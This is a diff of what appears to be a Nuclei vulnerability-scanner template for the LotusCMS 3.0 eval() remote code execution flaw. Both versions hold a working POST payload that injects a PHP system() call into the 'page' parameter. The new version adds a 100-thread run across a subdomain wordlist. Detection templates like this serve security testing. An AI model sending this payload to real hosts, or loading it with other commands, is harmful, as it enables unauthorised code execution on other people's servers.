@@ -1,41 +1,34 @@
-id: lotuscms-rce
-
+id: lotuscms-rce 2
 info:
-  name: LotusCMS 3.0 - Remote Code Execution
   author: pikpikcu
+  name: LotusCMS 3.0 eval() RCE
+  reference: https://github.com/Hood3dRob1n/LotusCMS-Exploit
   severity: critical
-  description: |
-    LotusCMS 3.0 is susceptible to remote code execution via the Router () function. This is done by embedding PHP code in the 'page' parameter, which will be passed to a eval call and allow remote code execution.
-  reference:
-    - https://github.com/Hood3dRob1n/LotusCMS-Exploit
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-    cvss-score: 10
-    cwe-id: CWE-77
-  metadata:
-    max-request: 2
   tags: lotuscms,rce
+requests:
+- attack: sniper
+  matchers:
+  - part: body
+    type: word
+    words:
+    - 38ee63071a04dc5e04ed22624c38e648
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'POST /lcms/index.php HTTP/1.1
 
-http:
-  - method: POST
-    path:
-      - "{{BaseURL}}/index.php"
-      - "{{BaseURL}}/lcms/index.php"
+    Host: {{Subdomains}}
 
-    headers:
-      Content-Type: application/x-www-form-urlencoded
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
 
-    body: |
-      page=index');${system('echo lotuscms_rce | md5sum')};#
+    Content-Type: application/x-www-form-urlencoded
 
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "38ee63071a04dc5e04ed22624c38e648"
 
-      - type: status
-        status:
-          - 200
-# digest: 490a00463044022005dd467f537d82001f9b7c24774e776b4c837f3d25e7b7ae4db5790505c760aa02207fd4582df515908e630a889a24de64f1bdbd5ccaa65e33210ebe86b0b73b9f29:922c64590222798bb761d5b6d8e72950
+    page=index'');${system(''echo lotuscms_rce | md5sum'')};#
+
+    '
+  threads: 100
